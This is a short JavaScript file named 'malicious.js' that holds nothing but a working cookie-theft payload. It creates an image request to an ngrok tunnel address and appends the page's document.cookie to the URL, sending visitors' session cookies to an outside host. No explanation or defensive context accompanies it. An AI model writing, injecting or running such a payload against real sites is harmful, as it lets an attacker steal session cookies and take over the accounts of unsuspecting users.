// malicious.js
new Image().src =
  "https://8590-2a02-6ea0-c10d-5485-00-14.ngrok-free.app/log?cookie=" +
  encodeURIComponent(document.cookie);
